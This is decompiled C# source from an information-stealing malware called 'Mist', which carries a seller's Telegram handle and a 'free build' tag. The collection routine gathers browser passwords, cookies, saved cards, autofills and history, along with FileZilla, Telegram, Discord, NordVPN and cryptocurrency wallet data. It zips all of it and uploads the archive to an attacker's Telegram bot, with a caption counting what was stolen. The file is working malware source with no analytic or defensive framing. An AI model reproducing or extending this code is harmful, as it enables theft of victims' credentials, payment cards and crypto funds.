using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Ionic.Zip;

namespace Mist
{
	// Token: 0x0200005A RID: 90
	public static class Collection
	{
		// Token: 0x06000251 RID: 593 RVA: 0x000111CC File Offset: 0x0000F3CC
		[STAThread]
		public static void GetChromium()
		{
			try
			{
				Chromium.GetCards(Help.Cards);
				Chromium.GetCookies(Help.Cookies);
				Chromium.GetPasswords(Help.Passwords);
				Chromium.GetAutofills(Help.Autofills);
				Chromium.GetDownloads(Help.Downloads);
				Chromium.GetHistory(Help.History);
				Chromium.GetPasswordsOpera(Help.Passwords);
				Chromium.GetCookiesOpera(Help.Cookies);
			}
			catch
			{
			}
		}

		// Token: 0x06000252 RID: 594 RVA: 0x00011240 File Offset: 0x0000F440
		public static void GetGecko()
		{
			try
			{
				Steal.Cookies();
				Steal.Passwords();
			}
			catch
			{
			}
		}

		// Token: 0x06000253 RID: 595 RVA: 0x0001126C File Offset: 0x0000F46C
		public static void GetCollection()
		{
			Collection.<>c__DisplayClass2_0 CS$<>8__locals1 = new Collection.<>c__DisplayClass2_0();
			try
			{
				Directory.CreateDirectory(Help.collectionDir);
				Directory.CreateDirectory(Help.Browsers);
				Directory.CreateDirectory(Help.Passwords);
				Directory.CreateDirectory(Help.Autofills);
				Directory.CreateDirectory(Help.Downloads);
				Directory.CreateDirectory(Help.Cookies);
				Directory.CreateDirectory(Help.History);
				Directory.CreateDirectory(Help.Cards);
			}
			catch
			{
			}
			Collection.<>c__DisplayClass2_0 CS$<>8__locals2 = CS$<>8__locals1;
			Task[] array = new Task[1];
			array[0] = new Task(delegate()
			{
				Files.GetFiles(Help.collectionDir);
			});
			CS$<>8__locals2.t0 = array;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals3 = CS$<>8__locals1;
			Task[] array2 = new Task[1];
			array2[0] = new Task(delegate()
			{
				Collection.GetChromium();
			});
			CS$<>8__locals3.t1 = array2;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals4 = CS$<>8__locals1;
			Task[] array3 = new Task[1];
			array3[0] = new Task(delegate()
			{
				Collection.GetGecko();
			});
			CS$<>8__locals4.t2 = array3;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals5 = CS$<>8__locals1;
			Task[] array4 = new Task[1];
			array4[0] = new Task(delegate()
			{
				Edge.GetEdge(Help.Passwords);
			});
			CS$<>8__locals5.t3 = array4;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals6 = CS$<>8__locals1;
			Task[] array5 = new Task[1];
			array5[0] = new Task(delegate()
			{
				FileZilla.GetFileZilla(Help.collectionDir);
			});
			CS$<>8__locals6.t5 = array5;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals7 = CS$<>8__locals1;
			Task[] array6 = new Task[1];
			array6[0] = new Task(delegate()
			{
				TotalCommander.GetTotalCommander(Help.collectionDir);
			});
			CS$<>8__locals7.t6 = array6;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals8 = CS$<>8__locals1;
			Task[] array7 = new Task[1];
			array7[0] = new Task(delegate()
			{
				NordVPN.GetNordVPN(Help.collectionDir);
			});
			CS$<>8__locals8.t9 = array7;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals9 = CS$<>8__locals1;
			Task[] array8 = new Task[1];
			array8[0] = new Task(delegate()
			{
				Telegram.GetTelegram(Help.collectionDir);
			});
			CS$<>8__locals9.t10 = array8;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals10 = CS$<>8__locals1;
			Task[] array9 = new Task[1];
			array9[0] = new Task(delegate()
			{
				Discord.GetDiscord(Help.collectionDir);
			});
			CS$<>8__locals10.t11 = array9;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals11 = CS$<>8__locals1;
			Task[] array10 = new Task[1];
			array10[0] = new Task(delegate()
			{
				Wallets.GetWallets(Help.collectionDir);
			});
			CS$<>8__locals11.t12 = array10;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals12 = CS$<>8__locals1;
			Task[] array11 = new Task[1];
			array11[0] = new Task(delegate()
			{
				Systemsinfo.GetSystemsData(Help.collectionDir);
			});
			CS$<>8__locals12.t13 = array11;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals13 = CS$<>8__locals1;
			Task[] array12 = new Task[1];
			array12[0] = new Task(delegate()
			{
				DomainDetect.GetDomainDetect(Help.Browsers);
			});
			CS$<>8__locals13.t14 = array12;
			try
			{
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t0;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t1;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t2;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t3;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t5;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t6;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t9;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t10;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t11;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t12;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t13;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t14;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				Task.WaitAll(CS$<>8__locals1.t0);
				Task.WaitAll(CS$<>8__locals1.t1);
				Task.WaitAll(CS$<>8__locals1.t2);
				Task.WaitAll(CS$<>8__locals1.t3);
				Task.WaitAll(CS$<>8__locals1.t5);
				Task.WaitAll(CS$<>8__locals1.t6);
				Task.WaitAll(CS$<>8__locals1.t9);
				Task.WaitAll(CS$<>8__locals1.t10);
				Task.WaitAll(CS$<>8__locals1.t11);
				Task.WaitAll(CS$<>8__locals1.t12);
				Task.WaitAll(CS$<>8__locals1.t13);
				Task.WaitAll(CS$<>8__locals1.t14);
			}
			catch
			{
			}
			try
			{
				string text = string.Concat(new string[]
				{
					Help.dir,
					"\\",
					Help.dateLog,
					"_",
					Help.HWID,
					Help.CountryCOde(),
					".zip"
				});
				using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
				{
					zipFile.ParallelDeflateThreshold = -1L;
					zipFile.UseZip64WhenSaving = 2;
					zipFile.CompressionLevel = 6;
					zipFile.AddDirectory(Help.collectionDir);
					zipFile.Comment = "123 test";
					zipFile.Save(text);
				}
				string text2 = text;
				byte[] file = File.ReadAllBytes(text2);
				string url = string.Concat(new string[]
				{
					Help.ApiUrl,
					Program.Token,
					"/sendDocument?chat_id=",
					Program.ID,
					string.Concat(new string[]
					{
						"&caption=\n \ud83c\udf3a new log \ud83c\udf38  \n============================\n\ud83c\udf06IP - ",
						Help.IP,
						"\n\ud83c\udfd9country - ",
						Help.Country(),
						"\n============================\n✨browser:\n∟\ud83c\udf6acookies - ",
						(Chromium.Cookies + Steal.count_cookies).ToString(),
						"\n ∟\ud83d\udd11password - ",
						(Chromium.Passwords + Edge.count + Steal.count).ToString(),
						"\n  ∟\ud83d\udd51History - ",
						Chromium.History.ToString(),
						"\n   ∟\ud83d\udcddAutofills - ",
						Chromium.Autofills.ToString(),
						"\n    ∟\ud83d\udcb3Cards - ",
						Chromium.CC.ToString(),
						"\n============================",
						(Wallets.count > 0) ? "\n\ud83d\udc8e crypto" : "",
						(Electrum.count > 0) ? "\n∟Electrum" : "",
						(Armory.count > 0) ? "\n∟Armory" : "",
						(AtomicWallet.count > 0) ? "\n∟Atomic" : "",
						(BitcoinCore.count > 0) ? "\n∟BitcoinCore" : "",
						(Bytecoin.count > 0) ? "\n∟Bytecoin" : "",
						(DashCore.count > 0) ? "\n∟DashCore" : "",
						(Ethereum.count > 0) ? "\n∟Ethereum" : "",
						(Exodus.count > 0) ? "\n∟Exodus" : "",
						(LitecoinCore.count > 0) ? "\n∟LitecoinCore" : "",
						(Monero.count > 0) ? "\n∟Monero" : "",
						(Zcash.count > 0) ? "\n∟Zcash" : "",
						(Jaxx.count > 0) ? "\n∟Jaxx" : "",
						(Wallets.count > 0) ? "\n============================" : "",
						(FileZilla.count > 0) ? ("\n\ud83d\udcc2FileZilla - " + FileZilla.count.ToString()) : "",
						(FileZilla.count > 0) ? "\n============================ " : "",
						"\n\ud83d\udcbefree buld\n\ud83d\udcc0by full - @Mist_Seller\n============================\n",
						File.ReadAllText(Help.Browsers + "\\DomainDetect.txt")
					})
				});
				SenderAPI.POST(file, text2, "application/x-ms-dos-executable", url);
			}
			catch
			{
			}
		}
	}
}
